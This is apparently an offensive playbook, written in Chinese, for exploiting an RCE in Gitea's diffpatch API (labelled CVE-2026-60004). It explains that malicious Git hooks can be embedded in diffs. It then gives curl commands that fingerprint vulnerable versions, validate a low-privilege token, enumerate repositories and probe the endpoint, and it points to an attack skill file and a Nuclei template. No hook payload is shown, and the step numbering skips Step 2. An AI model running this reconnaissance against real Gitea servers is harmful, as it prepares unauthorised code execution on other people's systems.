# Gitea diffpatch API RCE 手法

> CVE-2026-60004 · CVSS 9.8 · EPSS 82.4%（99.6 百分位）  
> CISA KEV 2026-08-25 · 在野利用已确认  
> Skill：`杀招/文仓/SKILL.md`  
> Nuclei：`tools/1day-kit/custom-templates/gitea-diffpatch-cve-2026-60004.yaml`

---

## 原理

Gitea < 1.27.1 的 `/api/v1/repos/{owner}/{repo}/diffpatch` 端点在 apply diff 时会
触发 Git hook，任意认证用户（包括低权限账号）可在 diff 里嵌入恶意 hook 脚本实现
服务端 RCE。修复版本：**Gitea ≥ 1.27.1**（2026-08 Release）。

## Step 1 — 版本指纹（无账号）

```bash
# 方法 A：版本 API（最直接）
curl -sk https://TARGET/api/v1/version | python3 -m json.tool
# {"version":"1.XX.X"} — < 1.27.1 即阳性

# 方法 B：Swagger info
curl -sk https://TARGET/api/swagger \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['info']['version'])"

# 方法 C：footer 页面（不需要 API）
curl -sk https://TARGET/ | grep -i 'powered by gitea\|gitea v'
```

## Step 3 — API 可达性（需低权账号）

```bash
TOKEN="YOUR_GITEA_TOKEN"   # Settings → Applications → Generate Token

# 验证 Token
curl -sk -H "Authorization: token $TOKEN" \
  "https://TARGET/api/v1/user" | python3 -m json.tool

# 枚举可访问仓库
curl -sk -H "Authorization: token $TOKEN" \
  "https://TARGET/api/v1/repos/search?limit=5" \
  | python3 -c "import sys,json; [print(r['full_name']) for r in json.load(sys.stdin)['data']]"

# diffpatch 端点存在性（空 body，只看响应码）
curl -sk -o /dev/null -w "%{http_code}\n" \
  -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: text/plain" \
  --data-raw "" \
  "https://TARGET/api/v1/repos/OWNER/REPO/diffpatch"
# 400/422 → 端点存在（参数校验）；404 → 不存在或版本 OK
```
